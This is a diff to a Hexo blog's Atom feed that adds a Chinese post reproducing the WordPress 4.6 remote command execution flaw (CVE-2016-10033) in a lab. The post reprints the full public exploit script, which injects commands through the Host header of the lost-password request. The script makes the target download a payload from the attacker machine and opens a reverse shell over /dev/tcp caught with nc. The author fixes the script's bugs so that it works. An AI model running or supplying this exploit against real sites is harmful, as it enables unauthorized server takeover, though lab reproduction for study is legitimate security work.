@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-01-23T02:03:46.779Z</updated>
+  <updated>2017-05-09T12:03:58.517Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,277 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>17.WordPress4.6任意命令执行漏洞复现与Exp简单分析</title>
+    <link href="http://yoursite.com/WordPress4-6%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8EExp%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
+    <id>http://yoursite.com/WordPress4-6任意命令执行漏洞复现与Exp简单分析/</id>
+    <published>2017-05-09T11:59:04.000Z</published>
+    <updated>2017-05-09T12:03:58.517Z</updated>
+    
+    <content type="html">&lt;p&gt;　　前阵子网上曝出了WordPress4.6的任意命令执行漏洞，而且还有poc和exp，不过貌似很多小伙伴复现失败了，这里就来分析分析吧！&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;　　这里简单说下漏洞形成的原因吧！其实，说到底算是老洞了，还记得去年的那个PHPMailer命令漏洞吗？漏洞编号：CVE-2016-10033！没错，就是它引发的这个WordPress4.6命令执行漏洞。我们利用WordPress中忘记密码功能，构造特殊的数据包，具体位置是header中的host参数，发送给服务器，host中的值被传递进了系统mail函数里面，最后触发了PHPMailer的命令执行漏洞。大体的形成原因就是酱紫的。&lt;/p&gt;
+&lt;p&gt;　　具体漏洞代码就不分析了，网上已经有了，还挺清晰，&lt;a href=&quot;http://blog.nsfocus.net/wordpress-4-6-implementation-vulnerability-analysis/&quot; title=&quot;漏洞代码分析传送门&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.nsfocus.net/wordpress-4-6-implementation-vulnerability-analysis/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;　　好了，接下来是本文的重点了。&lt;/p&gt;
+&lt;h2 id=&quot;靶机环境&quot;&gt;&lt;a href=&quot;#靶机环境&quot; class=&quot;headerlink&quot; title=&quot;靶机环境&quot;&gt;&lt;/a&gt;靶机环境&lt;/h2&gt;&lt;p&gt;　　首先是靶机环境问题，估计部分小伙伴复现不成功就是挂在靶机环境上了。&lt;/p&gt;
+&lt;p&gt;　　我用的是linux服务器（利用exp本身也是针对linux靶机的），windows的服务器暂时还没测试就先不说。&lt;/p&gt;
+&lt;p&gt;　　靶机环境如下：&lt;/p&gt;
+&lt;p&gt;　　服务器：ubuntu server 14.04&lt;/p&gt;
+&lt;p&gt;　　站点环境：apache 2.4.7、php 5.5.9、mysql 5.5&lt;/p&gt;
+&lt;p&gt;　　IP地址：192.168.10.33&lt;/p&gt;
+&lt;p&gt;　　怎么搭建php站点就不多说了，小伙伴们不明白的自己百度哈，在ubuntu上搭建还是很方便快捷的。然后下载wordpress4.6版本的源码，搭上去，具体步骤不懂的百度有，4.6版本传送门在这里&lt;a href=&quot;https://wordpress.org/wordpress-4.6.zip&quot; title=&quot;wordpress-4.6下载&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://wordpress.org/wordpress-4.6.zip&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;　　wordpress安装成功后登陆界面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　因为我们用的忘记密码功能涉及到发邮件，那么肯定要有邮件的服务啊&lt;br&gt;，我用的是exim4！这里说一下，没搭这个服务，估计是复现不了的。&lt;/p&gt;
+&lt;p&gt;　　ubuntu安装exim非常简单&lt;/p&gt;
+&lt;p&gt;　　&lt;code&gt;#apt-get install exim4&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;　　然后我们再进行一下配置&lt;/p&gt;
+&lt;p&gt;　　&lt;code&gt;#dpkg-reconfigure exim4-config&lt;/code&gt;　&lt;/p&gt;
+&lt;p&gt;　　选择第一个，使用SMTP进行网络发送邮件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　这里输入系统邮件的名称，随意，我用了本机IP&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　剩下的一路默认即可！freebuf上的文章说必须得exim4，我觉得不一定，只要能实现邮件服务器即可，验证成功与否直接通过搭好的wordpress忘记密码功能，执行一遍，没有出错就可以了！至此，我们的靶机环境就完成了！&lt;/p&gt;
+&lt;p&gt;　　攻击机我用的kali，脚本直接扔进去即可，这里需要注意的是，脚本权限要高，不然会执行失败，我直接设置成777了。&lt;/p&gt;
+&lt;p&gt;　　攻击机IP：192.168.10.55&lt;/p&gt;
+&lt;h2 id=&quot;EXP分析与配置&quot;&gt;&lt;a href=&quot;#EXP分析与配置&quot; class=&quot;headerlink&quot; title=&quot;EXP分析与配置&quot;&gt;&lt;/a&gt;EXP分析与配置&lt;/h2&gt;&lt;p&gt;　　靶机搞定了，现在我们需要调整一下利用脚本了！&lt;/p&gt;
+&lt;p&gt;　　原脚本源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+#
+#   __      __   __  __     __
+#  / /   ___  &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95; &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95; _/ /  / / / /___ &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/ /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;  &amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;
+# / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
+#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&amp;lt; /  __/ /  (__  )
+#  /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/
+#   /&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;&amp;amp;#95;/
+#
+#
+# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
+# CVE-2016-10033
+#
+# wordpress-rce-exploit.sh (ver. 1.0)
+#
+#
+# Discovered and coded by
+#
+# Dawid Golunski (@dawid_golunski)
+# https://legalhackers.com
+#
+# ExploitBox project:
+# https://ExploitBox.io
+#
+# Full advisory URL:
+# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
+#
+# Exploit src URL:
+# https://exploitbox.io/exploit/wordpress-rce-exploit.sh
+#
+#
+# Tested on WordPress 4.6:
+# https://github.com/WordPress/WordPress/archive/4.6.zip
+#
+# Usage:
+# ./wordpress-rce-exploit.sh target-wordpress-url
+#
+#
+# Disclaimer:
+# For testing purposes only
+#
+#
+# -----------------------------------------------------------------
+#
+# Interested in vulns/exploitation?
+#
+#
+#      .;lc&amp;apos;
+#     .,cdkkOOOko;.
+#     .,lxxkkkkOOOO000Ol&amp;apos;
+#    .&amp;apos;:oxxxxxkkkkOOOO0000KK0x:&amp;apos;
+#    .;ldxxxxxxxxkxl,.&amp;apos;lk0000KKKXXXKd;.
+#    &amp;apos;:oxxxxxxxxxxo;.    .:oOKKKXXXNNNNOl.
+#   &amp;apos;&amp;apos;;ldxxxxxdc,.     ,oOXXXNNNXd;,.
+#  .ddc;,,:c;.   ,c:   .cxxc:;:ox:
+#  .dxxxxo,  .,   ,kMMM0:.  .,  .lxxxxx:
+#  .dxxxxxc  lW. oMMMMMMMK  d0  .xxxxxx:
+#  .dxxxxxc  .0k.,KWMMMWNo :X:  .xxxxxx:
+#  .dxxxxxc   .xN0xxxxxxxkXK,   .xxxxxx:
+#  .dxxxxxc lddOMMMMWd0MMMMKddd.   .xxxxxx:
+#  .dxxxxxc   .cNMMMN.oMMMMx&amp;apos;   .xxxxxx:
+#  .dxxxxxc  lKo;dNMN.oMM0;:Ok. &amp;apos;xxxxxx:
+#  .dxxxxxc ;Mc   .lx.:o, Kl &amp;apos;xxxxxx:
+#  .dxxxxxdl;. .,      .. .;cdxxxxxx:
+#  .dxxxxxxxxxdc,.     &amp;apos;cdkkxxxxxxxx:
+#   .&amp;apos;:oxxxxxxxxxdl;.    .;lxkkkkkxxxxdc,.
+#    .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
+#    .&amp;apos;:oxxxxxxxxx.ckkkkkkkkxl,.
+#     .,cdxxxxx.ckkkkkxc.
+#     .&amp;apos;:odx.ckxl,.
+#      .,.&amp;apos;.
+#
+# https://ExploitBox.io
+#
+# https://twitter.com/Exploit_Box
+#
+# -----------------------------------------------------------------
+
+
+
+rev_host=&amp;quot;192.168.10.33&amp;quot;
+
+function prep_host_header() {  
+   cmd=&amp;quot;$1&amp;quot;
+   rce_cmd=&amp;quot;\${run{$cmd}}&amp;quot;;
+
+   # replace / with ${substr{0}{1}{$spool_directory}}
+   #sed &amp;apos;s^/^${substr{0}{1}{$spool_directory}}^g&amp;apos;
+   rce_cmd=&amp;quot;`echo $rce_cmd | sed &amp;apos;s^/^\${substr{0}{1}{\$spool_directory}}^g&amp;apos;`&amp;quot;
+
+   # replace &amp;apos; &amp;apos; (space) with
+   #sed &amp;apos;s^ ^${substr{10}{1}{$tod_log}}$^g&amp;apos;
+   rce_cmd=&amp;quot;`echo $rce_cmd | sed &amp;apos;s^ ^\${substr{10}{1}{\$tod_log}}^g&amp;apos;`&amp;quot;
+   #return &amp;quot;target(any -froot@localhost -be $rce_cmd null)&amp;quot;
+   host_header=&amp;quot;target(any -froot@localhost -be $rce_cmd null)&amp;quot;
+   return 0
+}
+
+
+#cat exploitbox.ans
+intro=&amp;quot;  
+DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r  
+bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f  
+G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c  
+G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg  
+IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f  
+IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f  
+X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6  
+b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb  
+NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N  
+TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1  
+QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz  
+NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g  
+G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54  
+eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb  
+WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO  
+TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg  
+ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb  
+MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD  
+G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob  
+WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz  
+NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb  
+MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f  
+X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4  
+bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&amp;quot;  
+intro2=&amp;quot;  
+ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09  
+fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb  
+MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg  
+ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE  
+aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09  
+fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg  
+ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh  
+bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt  
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt  
+ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp  
+bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1  
+cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&amp;quot;  
+echo &amp;quot;$intro&amp;quot;  | base64 -d  
+echo &amp;quot;$intro2&amp;quot; | base64 -d
+
+if [ &amp;quot;$#&amp;quot; -ne 1 ]; then  
+echo -e &amp;quot;Usage:\n$0 target-wordpress-url\n&amp;quot;  
+exit 1  
+fi  
+target=&amp;quot;$1&amp;quot;  
+echo -ne &amp;quot;\e[91m[*]\033[0m&amp;quot;  
+read -p &amp;quot; Sure you want to get a shell on the target &amp;apos;$target&amp;apos; ? [y/N] &amp;quot; choice  
+echo
+
+
+if [ &amp;quot;$choice&amp;quot; == &amp;quot;y&amp;quot; ]; then
+
+echo -e &amp;quot;\e[92m[*]\033[0m Guess I can&amp;apos;t argue with that... Let&amp;apos;s get started...\n&amp;quot;  
+echo -e &amp;quot;\e[92m[+]\033[0m Connected to the target&amp;quot;
+
+# Serve payload/bash script on :80
+RCE_exec_cmd=&amp;quot;(sleep 3s &amp;amp;&amp;amp; nohup bash -i &amp;gt;/dev/tcp/$rev_host/1337 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1) &amp;amp;&amp;quot;  
+echo &amp;quot;$RCE_exec_cmd&amp;quot; &amp;gt; rce.txt  
+python -mSimpleHTTPServer 80 2&amp;gt;/dev/null &amp;gt;&amp;amp;2 &amp;amp;  
+hpid=$!
+
+# Save payload on the target in /tmp/rce
+cmd=&amp;quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&amp;quot;  
+prep_host_header &amp;quot;$cmd&amp;quot;  
+curl -H&amp;quot;Host: $host_header&amp;quot; -s -d &amp;apos;user_login=admin&amp;amp;wp-submit=Get+New+Password&amp;apos; $target/wp-login.php?action=lostpassword  
+echo -e &amp;quot;\n\e[92m[+]\e[0m Payload sent successfully&amp;quot;
+
+# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
+cmd=&amp;quot;/bin/bash /tmp/rce&amp;quot;  
+prep_host_header &amp;quot;$cmd&amp;quot;  
+curl -H&amp;quot;Host: $host_header&amp;quot; -d &amp;apos;user_login=admin&amp;amp;wp-submit=Get+New+Password&amp;apos; $target/wp-login.php?action=lostpassword &amp;amp;  
+echo -e &amp;quot;\n\e[92m[+]\033[0m Payload executed!&amp;quot;
+
+echo -e &amp;quot;\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n&amp;quot;  
+nc -vv -l 1337  
+echo  
+else  
+echo -e &amp;quot;\e[92m[+]\033[0m Responsible choice ;)
+  Exiting.\n&amp;quot;  
+exit 0
+
+fi
+
+
+echo &amp;quot;Exiting...&amp;quot;  
+exit 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;　　先说说脚本整体预期达到的效果，是想通过该命令执行漏洞，往目标服务器的/tmp/中写入一个rce文件，然后执行rce文件中的命令连接我们攻击机上正在监听的nc程序，从而获得目标服务器的反弹shell。&lt;/p&gt;
+&lt;p&gt;　　整个脚本，前面注释部分不看，都是作者和漏洞本身一些信息，下面首先需要修改的就是变量&lt;code&gt;rev_host&lt;/code&gt;，这个是我们攻击机的IP，后面会用于目标服务器反弹shell时，请求连接的地址。源码158行可以看到反弹shell命令，变量&lt;code&gt;rev_host&lt;/code&gt;的值被传进命令中，下一行就是把命令写入本地rce.txt中，而164行可以看到，反弹shell命令被写入靶机服务器/tmp/目录中的rce文件中。&lt;/p&gt;
+&lt;p&gt;　　这里根据我的环境，设置成了&lt;code&gt;192.168.10.55&lt;/code&gt;，改完&lt;code&gt;rev_host&lt;/code&gt;之后，我们需要注意的就是166行和172行当中的&lt;code&gt;user_login&lt;/code&gt;的值，这里必须是跟你安装wordpress的时候，设置的管理员一致的用户名或邮箱地址，这里默认是admin，当然，如果是实际生产环境中的wordpress，任意一个用户名或邮箱地址也可以，但必须是正确的，不然根本触发不了漏洞，更别提命令执行了。&lt;/p&gt;
+&lt;p&gt;　　我安装wordpress就是用的admin做管理员用户名，那么我这里就不用改变，还是用&lt;code&gt;user_login=admin&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;　　现在我们可以尝试进行攻击了，这里需要注意的是，如果端口被占用了，我们就要换个端口，源码158行和176行中的1337改掉，换成其他端口即可，如替换成58888。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　另外看176行源码，我们会发现，nc命令中1337前面少了个参数-p，这也是我们执行失败的原因之一，不加-p的执行结果如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　所以176行源码改为&lt;code&gt;nc -vv -l -p 1337&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;　　那么到这里我们就把EXP脚本配置修改完毕了！&lt;/p&gt;
+&lt;p&gt;　　现在来整体解析下主要部分的功能！&lt;/p&gt;
+&lt;p&gt;　　81行&lt;code&gt;rev_host&lt;/code&gt;的值是攻击机的IP地址&lt;/p&gt;
+&lt;p&gt;　　83-97行，这部分是构造header中攻击代码的函数，具体把我们要执行的命令传递进来按照漏洞规则写进host中。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　142-155行，是判断输入，是否输入目标地址，以及是否确认获取目标地址的反弹shell。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　157-161行，这里是把目标服务器（靶机）请求连接的命令写入到当前目录中的rce.txt文件中，同时使用python把当前目录临时发布到http网络中，使得可以远程访问当前目录中的文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　163行-173行，这部分调用了两次prep_host_header函数，也执行了两次命令，163-167行是在靶机上执行命令，远程把攻击机上的rce.txt文件内容下载到本地/tmp/目录下的rce文件中；而169-173行是在靶机上执行命令，执行/tmp/目录下的rce文件，也就是执行了rce中的请求连接攻击机的命令，以此达到反弹shell到攻击机的目的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　最后一部分，这里是在攻击机上执行nc监听命令，监听并连接靶机发送过来的连接请求，从而得到靶机的shell。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-10.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;EXP攻击效果展示&quot;&gt;&lt;a href=&quot;#EXP攻击效果展示&quot; class=&quot;headerlink&quot; title=&quot;EXP攻击效果展示&quot;&gt;&lt;/a&gt;EXP攻击效果展示&lt;/h2&gt;&lt;p&gt;　　EXP攻击命令：&lt;br&gt;　　&lt;code&gt;#./test.sh http://192.168.10.33/frame/WordPress/WordPress-4.6/&lt;/code&gt;&lt;br&gt;　　从攻击命令可以看出，不需要什么特殊连接，直接就是wordpress的主页地址即可。攻击成功后，效果如图：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-11.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　执行whoami和ifconfig命令：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/17/17-12.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;　　整个攻击过程，需要注意的问题：&lt;/p&gt;
+&lt;p&gt;　　1、靶机的搭建，邮件服务必须有&lt;/p&gt;
+&lt;p&gt;　　2、EXP中攻击机的IP设置&lt;/p&gt;
+&lt;p&gt;　　3、EXP中nc命令的修改&lt;/p&gt;
+&lt;p&gt;　　4、EXP中wordpress用户名或邮箱地址必须正确&lt;/p&gt;
+&lt;p&gt;　　5、脚本的执行权限&lt;/p&gt;
+&lt;p&gt;　　PS：从该EXP源码中，我们不难看出，其基本都是给予攻击机和靶机都是linux系统而写的各种执行命令，如164行调用靶机的curl进行获取远程服务器的rce.txt文件，160行在攻击机上使用python和176行使用nc,这些都是在linux上执行时的命令格式，如果使用windows系统，那么就需要一一做修改，而且还需要在windows系统中安装各种环境和配置，而这些在linux系统中，基本都是默认就拥有且可以使用的，所以在这里，建议小伙伴们还是用linux系统来复现吧！&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;　　前阵子网上曝出了WordPress4.6的任意命令执行漏洞，而且还有poc和exp，不过貌似很多小伙伴复现失败了，这里就来分析分析吧！&lt;br&gt;
+    
+    </summary>
+    
+      <category term="others" scheme="http://yoursite.com/categories/others/"/>
+    
+    
+      <category term="exp" scheme="http://yoursite.com/tags/exp/"/>
+    
+      <category term="wordpress" scheme="http://yoursite.com/tags/wordpress/"/>
+    
+  </entry>
   
   <entry>
     <title>15.使用ubuntu和shadowsocks搭建vpn服务器</title>
